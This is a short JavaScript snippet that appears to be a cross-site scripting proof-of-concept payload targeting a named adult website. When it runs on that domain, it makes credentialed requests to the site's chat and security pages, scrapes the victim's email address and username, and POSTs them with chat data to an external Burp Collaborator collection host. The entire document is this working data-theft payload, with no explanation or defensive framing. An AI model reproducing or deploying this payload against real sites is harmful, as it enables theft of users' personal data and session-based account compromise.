if (document.domain == "www.pornhub.com") {
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("GET", "/chat/check");
    xhr.onreadystatechange = () => {
        if (xhr.readyState == 4) {
           var message=xhr.responseText
            xhr.open("GET", "/user/security");
            xhr.onreadystatechange = () => {
                if (xhr.readyState == 4) {
                    const parser = new DOMParser();
                    var dom = parser.parseFromString(xhr.responseText, "text/html")
                    var email = dom.getElementById("email").value;
                    var username = dom.getElementById("username").value;
                    xhr.open("POST","https://0205owlgt2ewl0kxfcud4vasdjjb70.burpcollaborator.net");
    xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");

    xhr.send(`email=${email}&username=${username}&message=${message}`);
                }
            }
            xhr.send()
        }
    }
    xhr.send()
}
